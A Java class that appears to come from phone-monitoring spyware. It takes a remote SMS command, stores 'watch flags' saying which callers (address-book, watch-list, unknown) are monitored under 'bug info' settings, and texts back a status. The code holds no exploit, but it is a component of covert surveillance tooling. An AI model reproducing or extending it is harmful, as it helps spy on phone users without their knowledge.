package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.command.SetWatchFlagsCmd;
import com.vvt.rmtcmd.command.WatchFlags;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSetWatchFlags extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSSetWatchFlags(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getSetWatchFlagsCmd());
		try {
			SetWatchFlagsCmd setWatchFlag = (SetWatchFlagsCmd) rmtCmdLine;
			WatchFlags flag = setWatchFlag.getWatchFlags();
			prefWatchList.setInAddrbookEnabled(flag.isInAddressbook());
			prefWatchList.setInWatchListEnabled(flag.isInWatchList());
			prefWatchList.setNotInAddrbookEnabled(flag.isNotAddressbook());
			prefWatchList.setUnknownEnabled(flag.isUnknownNumber());
			prefBugInfo.setPrefWatchListInfo(prefWatchList);
			pref.commit(prefBugInfo);
			responseMessage.append(Constant.OK);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSSetWatchFlagsCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
